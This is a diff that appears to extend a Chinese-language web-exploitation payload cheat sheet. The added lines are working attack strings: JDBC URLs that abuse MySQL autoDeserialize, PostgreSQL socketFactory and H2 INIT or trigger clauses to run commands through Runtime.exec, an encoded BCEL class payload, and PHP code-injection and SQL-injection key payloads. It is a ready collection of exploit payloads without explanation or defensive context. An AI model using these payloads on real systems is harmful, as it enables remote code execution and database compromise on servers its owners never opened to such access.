@@ -251,8 +251,40 @@ ${byte}, </#list>]
 
 ```
 
+# JDBC 反序列化
+```
+测试1:
+jdbc:mysql://172.16.1.2:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root
+
+测试2:
+jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('cmd /c calc')\;
 
 
+测试3：
+jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER UNAM4 BEFORE SELECT ON
+INFORMATION_SCHEMA.TABLES AS $$ void UNAM4() throws Exception{ Runtime.getRuntime().exec("cmd /c calc")\;}$$
+
+测试4:
+jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=nulltjmMEdVUfP.xml
+
+
+```
+
+## jdbc
+```
+测试1:
+127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=nulltjmMEdVUfP.xml
+
+
+测试2:
+172.16.1.2:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root
+```
+
+
+# BCEL 
+```
+$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$db$40$U$3d$938$b1c$9c$G$C$BZ$fa$I$ef$80$E$96$d8$82X$QQ$a9$aa$81$aaAt$3d$ZFa$c0$f1D$ce$E$c1$X$b1f$D$88$F$l$c0G$n$ee$98$94$o$VK$9e$fb$3c$e7$9e$3b$f3$f8t$ff$A$60$DK$3e$3cL$f9$98$c6G$P$9f$ac$9dq$f1$d9G$B_$5c$7cu$f1$8d$a1$b8$a5$Se$b6$Z$f2$8d$95$p$G$a7$a9$8f$rC$rR$89$dc$lt$db2$3d$e4$ed$982$d5H$L$k$l$f1T$d9x$98t$cc$89$ea3LE$7b$b2$ab$d3$cb$d6$89$8c$e3p$a7$b9$h$85$d4$x6$Z$bc$z$R$P$f9$Z$f5$d7$a2S$7e$ceC$a5$c3$l$H$bb$XB$f6$8c$d2$J$b5$95$5b$86$8b$b3$3d$de$cbxI$o$83$df$d2$83T$c8$ef$ca$ce$vY$bau$8b$NP$82$ef$a2$k$60$Ws$a4J$f7dR_$e3$f5$s5$Mbnt$g$60$k$L$M$e3$efL$K$b0$I$9fT$bc$ab$96a4$83$c4$3c$e9$84$H$edS$v$M$c3$d8$bf$d4$efAbT$97$c4$f8$ji$5e$83Zc$r$fa$af$876r$e4$85$q$ca$e5$c6$9bj$cb$a4$w$e9l$be$F$fcJ$b5$90$fd$3e$B$w$3d$w$9a$ec$k$OS$$$q$ed$e7$d2$e3$d9$_$Hf$b7$a6s$84$a2$90$y$p$5bX$bd$F$bb$ce$ca$B$9d$c5$97$q$cat$GC$ff$D$wd$3d$8c$be$82yF$GT$ef$90$ab$e6o$e0$fc$b9$82$f7s$f5$G$c5$eb$y_$ol$B$f9$8cq$92$3c$8b$$$R$d2$5e$7b$99X$c6$c8$fb$3b$a1$M$87$e2$wE$e3$f4$bb$c8E$$$s$i$w$d42Q$93$cfC$e1$98g$86$C$A$A
+```
 
 
 # Fastjson  Payload
@@ -488,3 +520,14 @@ ud=H4sIACj8I2kC%2FyvIKMjMS8vX0AQA5DkcsgkAAAA%3D
 id=%1F%8B%08%00%28%FC%23i%02%FF%2B%C8%28%C8%CCK%CB%D7%D0%04%00%E49%1C%B2%09%00%00%00
 
 ```
+
+
+# Key 注入方式
+```
+abc[phpinfo();//]=1
+tel[tel') VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a]=1111
+
+```
+
+
+
